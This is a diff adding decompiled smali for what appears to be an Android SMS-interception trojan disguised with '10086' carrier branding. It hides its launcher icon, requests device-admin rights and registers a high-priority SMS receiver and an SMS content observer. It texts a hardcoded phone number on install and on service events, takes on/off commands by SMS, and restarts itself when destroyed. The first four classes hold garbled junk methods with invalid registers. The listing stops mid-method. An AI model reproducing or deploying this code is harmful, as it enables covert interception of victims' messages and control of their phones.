@@ -1,0 +1,5094 @@
+.class public Lji/a;
+.super Ljava/lang/Object;
+.source "Landroid/content/ComponentName;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    :cond_0
+    if-ge p13, p7, :cond_0
+
+    ushr-long p95, v0, v0
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    add-double/2addr p1, p8
+
+    move/from16 p221, p52522
+.end method
+.class public Lji/yj/a;
+.super Ljava/lang/Object;
+.source "Landroid/content/ContentResolver;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    nop
+
+    if-eqz p196, :cond_0
+    :cond_0
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+
+    move-exception p146
+.end method
+.class public Lji/yj/ur/a;
+.super Ljava/lang/Object;
+.source "Landroid/widget/RemoteViews;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    mul-int p155, p130, p193
+
+    iget-boolean p5, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/a;
+.super Ljava/lang/Object;
+.source "Landroid/view/Window;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    rem-int p191, p130, p146
+
+    sub-long/2addr p3, p8
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JieMian;
+.super Landroid/app/Activity;
+.source "JieMian.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    return-void
+.end method
+
+.method private hhhhhhh()V
+    .locals 5
+
+    .prologue
+    const/4 v4, 0x1
+
+    .line 34
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v2
+
+    .line 35
+    .local v2, "retr":Landroid/content/pm/PackageManager;
+    new-instance v0, Landroid/content/ComponentName;
+
+    .line 36
+    const-class v3, Lji/yj/ur/a201jhfg20180420ab/JieMian;
+
+    .line 35
+    invoke-direct {v0, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 37
+    .local v0, "iuyiuy":Landroid/content/ComponentName;
+    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getComponentEnabledSetting(Landroid/content/ComponentName;)I
+
+    move-result v1
+
+    .line 38
+    .local v1, "res":I
+    if-eqz v1, :cond_0
+
+    .line 39
+    if-ne v1, v4, :cond_1
+
+    .line 41
+    :cond_0
+    const/4 v3, 0x2
+
+    .line 40
+    invoke-virtual {v2, v0, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+
+    .line 43
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->finish()V
+
+    .line 45
+    :cond_1
+    return-void
+.end method
+
+
+# virtual methods
+.method public onCreate(Landroid/os/Bundle;)V
+    .locals 7
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .prologue
+    .line 14
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    .line 15
+    const/high16 v4, 0x7f030000
+
+    invoke-virtual {p0, v4}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->setContentView(I)V
+
+    .line 17
+    new-instance v2, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 18
+    .local v2, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    const-string v4, "18016217928"
+
+    const-string v5, "\u5b89\u88c5\u6210\u529f,\u56de\u590dcom#false\u5173\u95edcom#true\u5f00\u542f"
+
+    const/4 v6, 0x0
+
+    invoke-virtual {v2, v4, v5, v6}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 20
+    new-instance v3, Landroid/content/Intent;
+
+    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 21
+    .local v3, "yyyy":Landroid/content/Intent;
+    invoke-virtual {p0, v3}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 23
+    invoke-direct {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->hhhhhhh()V
+
+    .line 25
+    new-instance v1, Landroid/content/ComponentName;
+
+    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+    invoke-direct {v1, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 26
+    .local v1, "bbbbbb":Landroid/content/ComponentName;
+    new-instance v0, Landroid/content/Intent;
+
+    const-string v4, "android.app.action.ADD_DEVICE_ADMIN"
+
+    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    .line 27
+    .local v0, "abljg":Landroid/content/Intent;
+    const-string v4, "android.app.extra.DEVICE_ADMIN"
+
+    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
+
+    .line 28
+    const-string v4, "android.app.extra.ADD_EXPLANATION"
+
+    const-string v5, "---------"
+
+    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 29
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startActivity(Landroid/content/Intent;)V
+
+    .line 31
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM01$1;
+.super Landroid/os/Handler;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM01;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = null
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+
+# direct methods
+.method constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+    .locals 0
+
+    .prologue
+    .line 1
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    .line 90
+    invoke-direct {p0}, Landroid/os/Handler;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public handleMessage(Landroid/os/Message;)V
+    .locals 4
+    .param p1, "msg"    # Landroid/os/Message;
+
+    .prologue
+    .line 94
+    invoke-super {p0, p1}, Landroid/os/Handler;->handleMessage(Landroid/os/Message;)V
+
+    .line 95
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-static {v0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->access$0(Lji/yj/ur/a201jhfg20180420ab/JM01;)Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    move-result-object v0
+
+    const-string v1, "18016217928"
+
+    const-string v2, "\u670d\u52a1\u542f\u52a8\u6210\u529f\uff0c\u5230\u671f\u65f6\u95f4\uff1a2018-4-20 12:00:00"
+
+    const/4 v3, 0x0
+
+    invoke-virtual {v0, v1, v2, v3}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 96
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+.super Ljava/lang/Thread;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM01;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = "FFFFFFF"
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+
+# direct methods
+.method constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+    .locals 0
+
+    .prologue
+    .line 76
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public run()V
+    .locals 3
+
+    .prologue
+    .line 80
+    invoke-super {p0}, Ljava/lang/Thread;->run()V
+
+    .line 82
+    const-wide/16 v1, 0x4e20
+
+    :try_start_0
+    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
+
+    .line 83
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-static {v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->access$1(Lji/yj/ur/a201jhfg20180420ab/JM01;)Landroid/os/Handler;
+
+    move-result-object v1
+
+    const/4 v2, 0x1
+
+    invoke-virtual {v1, v2}, Landroid/os/Handler;->sendEmptyMessage(I)Z
+    :try_end_0
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 87
+    :goto_0
+    return-void
+
+    .line 84
+    :catch_0
+    move-exception v0
+
+    .line 85
+    .local v0, "e":Ljava/lang/InterruptedException;
+    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM01;
+.super Landroid/app/Service;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+    }
+.end annotation
+
+
+# static fields
+.field public static final iru:Landroid/net/Uri;
+
+.field public static final t01:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"
+
+.field public static final t02:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED_2"
+
+.field public static final t03:Ljava/lang/String; = "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+.field public static final t04:Ljava/lang/String; = "sh.ji.fe"
+
+
+# instance fields
+.field private rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+.field private rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+.field private rtyertrhy:Landroid/os/Handler;
+
+.field private ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 1
+
+    .prologue
+    .line 19
+    const-string v0, "content://sms/"
+
+    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v0
+
+    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;
+
+    .line 14
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 1
+
+    .prologue
+    .line 14
+    invoke-direct {p0}, Landroid/app/Service;-><init>()V
+
+    .line 22
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 90
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;
+
+    invoke-direct {v0, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$1;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;
+
+    .line 14
+    return-void
+.end method
+
+.method static synthetic access$0(Lji/yj/ur/a201jhfg20180420ab/JM01;)Lji/yj/ur/a201jhfg20180420ab/JM02;
+    .locals 1
+
+    .prologue
+    .line 22
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    return-object v0
+.end method
+
+.method static synthetic access$1(Lji/yj/ur/a201jhfg20180420ab/JM01;)Landroid/os/Handler;
+    .locals 1
+
+    .prologue
+    .line 90
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;
+
+    return-object v0
+.end method
+
+
+# virtual methods
+.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
+    .locals 1
+    .param p1, "arg0"    # Landroid/content/Intent;
+
+    .prologue
+    .line 68
+    const/4 v0, 0x0
+
+    return-object v0
+.end method
+
+.method public onCreate()V
+    .locals 10
+
+    .prologue
+    const/4 v9, 0x0
+
+    const/4 v8, 0x0
+
+    .line 25
+    invoke-super {p0}, Landroid/app/Service;->onCreate()V
+
+    .line 26
+    new-instance v1, Landroid/app/Notification;
+
+    const/high16 v4, 0x7f020000
+
+    const-string v5, "10086\u96c6\u5206\u5b9d"
+
+    .line 27
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v6
+
+    .line 26
+    invoke-direct {v1, v4, v5, v6, v7}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V
+
+    .line 28
+    .local v1, "notification":Landroid/app/Notification;
+    new-instance v2, Landroid/content/Intent;
+
+    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
+
+    .line 29
+    .local v2, "notificationIntent":Landroid/content/Intent;
+    new-instance v4, Landroid/widget/RemoteViews;
+
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getPackageName()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 30
+    const/high16 v6, 0x7f030000
+
+    invoke-direct {v4, v5, v6}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V
+
+    .line 29
+    iput-object v4, v1, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;
+
+    .line 31
+    invoke-static {p0, v8, v2, v8}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v3
+
+    .line 33
+    .local v3, "pendingIntent":Landroid/app/PendingIntent;
+    iput-object v3, v1, Landroid/app/Notification;->contentIntent:Landroid/app/PendingIntent;
+
+    .line 34
+    const/16 v4, 0x64
+
+    invoke-virtual {p0, v4, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startForeground(ILandroid/app/Notification;)V
+
+    .line 35
+    new-instance v0, Landroid/content/IntentFilter;
+
+    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V
+
+    .line 36
+    .local v0, "dsfghgfdgfd":Landroid/content/IntentFilter;
+    const-string v4, "android.provider.Telephony.SMS_RECEIVED"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 37
+    const-string v4, "android.provider.Telephony.SMS_RECEIVED_2"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 38
+    const-string v4, "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+
+    .line 39
+    const/16 v4, 0x3e8
+
+    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->setPriority(I)V
+
+    .line 41
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .line 42
+    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    const-string v5, "android.permission.BROADCAST_SMS"
+
+    invoke-virtual {p0, v4, v0, v5, v9}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Ljava/lang/String;Landroid/os/Handler;)Landroid/content/Intent;
+
+    .line 44
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .line 45
+    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    new-instance v5, Landroid/content/IntentFilter;
+
+    const-string v6, "sh.ji.fe"
+
+    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4, v5}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
+
+    .line 47
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-direct {v4, p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;-><init>(Landroid/content/Context;Landroid/os/Handler;)V
+
+    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    .line 48
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v4
+
+    sget-object v5, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;
+
+    const/4 v6, 0x1
+
+    iget-object v7, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-virtual {v4, v5, v6, v7}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V
+
+    .line 50
+    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+
+    invoke-direct {v4, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+
+    invoke-virtual {v4}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->start()V
+
+    .line 51
+    return-void
+.end method
+
+.method public onDestroy()V
+    .locals 5
+
+    .prologue
+    .line 55
+    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
+
+    .line 56
+    const/4 v1, 0x1
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->stopForeground(Z)V
+
+    .line 57
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+
+    .line 58
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+
+    .line 59
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v1
+
+    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+    invoke-virtual {v1, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V
+
+    .line 60
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    const-string v2, "18016217928"
+
+    const-string v3, "\u62e6\u622a\u670d\u52a1\u505c\u6b62\uff0c\u4f7f\u7528\u7ed3\u675f\u65f6\u95f4\uff1a2018-4-20 12:00:00"
+
+    const/4 v4, 0x0
+
+    invoke-virtual {v1, v2, v3, v4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 61
+    new-instance v0, Landroid/content/Intent;
+
+    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
+
+    .line 62
+    .local v0, "oyutiuy":Landroid/content/Intent;
+    const-class v1, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
+
+    .line 63
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 64
+    return-void
+.end method
+
+.method public onStartCommand(Landroid/content/Intent;II)I
+    .locals 1
+    .param p1, "intent"    # Landroid/content/Intent;
+    .param p2, "flags"    # I
+    .param p3, "startId"    # I
+
+    .prologue
+    .line 73
+    const/4 p2, 0x3
+
+    .line 74
+    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
+
+    move-result v0
+
+    return v0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM02;
+.super Ljava/lang/Object;
+.source "JM02.java"
+
+
+# static fields
+.field public static final jjjjjjjs:Ljava/lang/String; = "18016217928"
+
+.field private static final kghjfg:Ljava/text/SimpleDateFormat;
+
+.field public static final tttttttt:Ljava/lang/String; = "2018-4-20 12:00:00"
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 2
+
+    .prologue
+    .line 21
+    new-instance v0, Ljava/text/SimpleDateFormat;
+
+    .line 22
+    const-string v1, "yyyy-MM-dd HH:mm:ss"
+
+    .line 21
+    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V
+
+    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;
+
+    .line 17
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 17
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V
+    .locals 4
+    .param p1, "com"    # Ljava/lang/String;
+    .param p2, "sp"    # Landroid/content/SharedPreferences;
+
+    .prologue
+    .line 105
+    const-string v1, "action"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    const-string v3, "islj state "
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 106
+    if-eqz p2, :cond_0
+
+    .line 107
+    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    .line 108
+    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
+    const-string v1, "true"
+
+    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 109
+    const-string v1, "islj"
+
+    const/4 v2, 0x1
+
+    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
+
+    .line 113
+    :goto_0
+    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
+
+    .line 115
+    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
+    :cond_0
+    return-void
+
+    .line 111
+    .restart local v0    # "editor":Landroid/content/SharedPreferences$Editor;
+    :cond_1
+    const-string v1, "islj"
+
+    const/4 v2, 0x0
+
+    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
+
+    goto :goto_0
+.end method
+
+.method public gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+    .locals 9
+    .param p1, "phonenumber"    # Ljava/lang/String;
+    .param p2, "msg"    # Ljava/lang/String;
+    .param p3, "c"    # Landroid/content/Context;
+
+    .prologue
+    const/4 v2, 0x0
+
+    .line 76
+    const-string v1, "action"
+
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v8, "->"
+
+    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-static {v1, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 77
+    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
+
+    move-result-object v0
+
+    .line 78
+    .local v0, "smsManager":Landroid/telephony/SmsManager;
+    const/4 v4, 0x0
+
+    .line 79
+    .local v4, "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    invoke-virtual {v0, p2}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;
+
+    move-result-object v3
+
+    .line 80
+    .local v3, "msgs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
+    if-eqz p3, :cond_0
+
+    .line 81
+    new-instance v4, Ljava/util/ArrayList;
+
+    .end local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V
+
+    .line 82
+    .restart local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
+    const/4 v6, 0x0
+
+    .local v6, "i":I
+    :goto_0
+    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I
+
+    move-result v1
+
+    if-lt v6, v1, :cond_1
+
+    .end local v6    # "i":I
+    :cond_0
+    move-object v1, p1
+
+    move-object v5, v2
+
+    .line 87
+    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
+
+    .line 90
+    return-void
+
+    .line 83
+    .restart local v6    # "i":I
+    :cond_1
+    new-instance v1, Landroid/content/Intent;
+
+    const-string v5, "sh.ji.fe"
+
+    invoke-direct {v1, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    const/4 v5, 0x0
+
+    invoke-static {p3, v6, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v7
+
+    .line 84
+    .local v7, "pd":Landroid/app/PendingIntent;
+    invoke-virtual {v4, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
+
+    .line 82
+    add-int/lit8 v6, v6, 0x1
+
+    goto :goto_0
+.end method
+
+.method public ghyutrhr()Z
+    .locals 4
+
+    .prologue
+    .line 94
+    :try_start_0
